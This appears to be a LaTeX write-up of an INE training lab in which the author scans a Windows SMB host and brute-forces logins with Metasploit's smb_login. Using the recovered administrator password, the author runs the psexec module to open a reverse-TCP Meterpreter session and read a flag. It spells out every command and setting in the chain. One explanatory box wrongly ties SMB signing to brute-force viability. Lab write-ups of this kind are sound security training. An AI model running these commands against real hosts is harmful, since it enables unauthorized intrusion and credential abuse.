\chapter{Lab: SMB Server PSexec}
\label{lab:smb_psexec}

\begin{notebox}[Lab objective]
Fingerprint the SMB service on a Windows target, brute-force valid credentials
using Metasploit's \ic{smb\_login} scanner, then use the administrator account
with the PSexec exploit to gain a Meterpreter session and retrieve the flag.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Environment}
\begin{itemize}
  \item \textbf{Attacker:} Kali Linux (INE lab environment)
  \item \textbf{Target:} \ic{demo.ine.local} --- \ic{10.2.28.213}
  \item \textbf{Tools:} \ic{ping}, \ic{nmap}, Metasploit (\ic{smb\_login} +
        \ic{psexec})
  \item \textbf{Wordlists:} Metasploit built-in (\ic{common\_users.txt} +
        \ic{unix\_passwords.txt})
\end{itemize}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 1 --- Confirm the Host is Up}

\begin{termbox}
ping -c 1 demo.ine.local
\end{termbox}

Host responded. TTL of 125 is a Windows fingerprint --- Linux would typically be
64. Got the IP \ic{10.2.28.213} confirmed.

\screenshot{assets/images/Screenshot_2026-04-13_at_10.20.04_PM.png}{Ping confirming demo.ine.local is alive at 10.2.28.213}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 2 --- Port Scan with Service and Version Detection}

\begin{termbox}
nmap -sV -sC 10.2.28.213
\end{termbox}

\textbf{Key findings:}
\begin{itemize}
  \item \textbf{Port 445 open} --- SMB2 running
  \item \textbf{SMB signing: enabled but not required} --- relay attacks viable
  \item \textbf{Product Version: 10.0.14393} --- Windows Server 2016
  \item \textbf{Port 3389 open} --- RDP (useful for later pivoting if needed)
  \item Computer name: \ic{EC2AMAZ-408S766}
\end{itemize}

\begin{whybox}[Why message signing matters]
SMB message signing not being required is a misconfiguration. It means an
attacker can relay authentication attempts without the server rejecting them.
This is the condition that makes brute-force and credential relay attacks viable.
\end{whybox}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.22.00_PM.png}{nmap results showing SMB2 on port 445 with signing not required}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 3 --- Start Metasploit and Create Workspace}



\begin{termbox}
service postgresql start && msfconsole
workspace -a windows_smb_server_PSexec
\end{termbox}

\begin{whybox}[Why message signing matters]

Created a dedicated workspace so these results stay isolated from other labs.

\screenshot{assets/images/Screenshot_2026-04-13_at_10.25.20_PM.png}{Metasploit started with new workspace created}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 4 --- Brute-Force SMB Credentials}

\begin{termbox}
search smb_login
use auxiliary/scanner/smb/smb_login
set RHOST 10.2.28.213
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
\end{termbox}

I set \ic{VERBOSE false} because I don't want to sit through thousands of failed
lines. I only care about the successes.

\screenshot{assets/images/Screenshot_2026-04-13_at_10.27.51_PM.png}{smb\_login configuration with wordlists and VERBOSE false}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.41.50_PM.png}{smb\_login results showing 4 valid credential pairs found}

\textbf{Credentials found:}
\begin{itemize}
  \item \ic{sysadmin:samantha}
  \item \ic{demo:victoria}
  \item \ic{auditor:elizabeth}
  \item \textbf{\ic{administrator:qwertyuiop}} $\leftarrow$ this is the one
\end{itemize}

Four credential pairs found. The administrator account has full system privileges
so that is the one going straight into PsExec.

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 5 --- Exploit with PsExec}

\begin{termbox}
search psexec
use exploit/windows/smb/psexec
# No payload configured --- defaults to windows/meterpreter/reverse_tcp

set RHOST 10.2.28.213
set SMBUser Administrator
set SMBPass qwertyuiop
set LHOST 10.10.37.4    # My Kali VPN interface --- must be VPN, not loopback
exploit
\end{termbox}

\begin{whybox}[Why VPN interface for LHOST]
LHOST must be the VPN interface (the \ic{10.10.x.x} address in INE labs).
The target machine needs to be able to reach back to the attacker. If LHOST
is set to \ic{127.0.0.1} or the wrong interface, the reverse shell has nowhere
to connect and the session never opens.
\end{whybox}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.43.56_PM.png}{PsExec exploit configured with administrator credentials}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.51.06_PM.png}{Meterpreter session 1 opened as Administrator}

\textbf{What happened:}
\begin{enumerate}
  \item Reverse TCP handler started on my listener port
  \item Module connected to SMB on port 445
  \item Authenticated as Administrator with the found credentials
  \item Metasploit selected PowerShell as the execution target (modern Windows)
  \item Payload executed --- ``service start timed out'' is normal (standalone
        process, not a registered service)
  \item \textbf{Meterpreter session 1 opened}
\end{enumerate}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 6 --- Post-Exploitation and Flag}

\begin{termbox}
meterpreter > cd /
meterpreter > ls
# flag.txt visible in C:\
meterpreter > cat flag.txt
\end{termbox}

\ic{flag.txt} was sitting right at the root of \ic{C:\textbackslash}. One
command and the lab was done.

\screenshot{assets/images/Screenshot_2026-04-13_at_10.53.37_PM.png}{ls showing flag.txt at C:\ root}

\screenshot{assets/images/Screenshot_2026-04-13_at_10.53.37_PM.png}{cat flag.txt --- flag captured and lab complete}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Result}

Flag retrieved. 1 of 1 flags captured. Lab complete.

% ─────────────────────────────────────────────────────────────────────────────
\section*{Key Learning}

\begin{takebox}
\begin{itemize}
  \item The TTL from the ping (125) already hinted Windows before nmap ran.
        Small passive signals matter.
  \item \ic{nmap -sC} running the SMB NSE scripts automatically pulled the OS
        version, signing status, computer name, and domain. No separate
        enumeration tool needed.
  \item SMB signing not being required was the technical condition that made this
        entire attack chain possible. One config setting.
  \item \ic{VERBOSE false} during brute-force is a habit --- it turns thousands
        of lines into just the four that mattered.
  \item Everything fed forward: IP from ping $\rightarrow$ nmap $\rightarrow$
        smb\_login $\rightarrow$ psexec. Each step built directly on the last.
\end{itemize}
\end{takebox}

\end{whybox}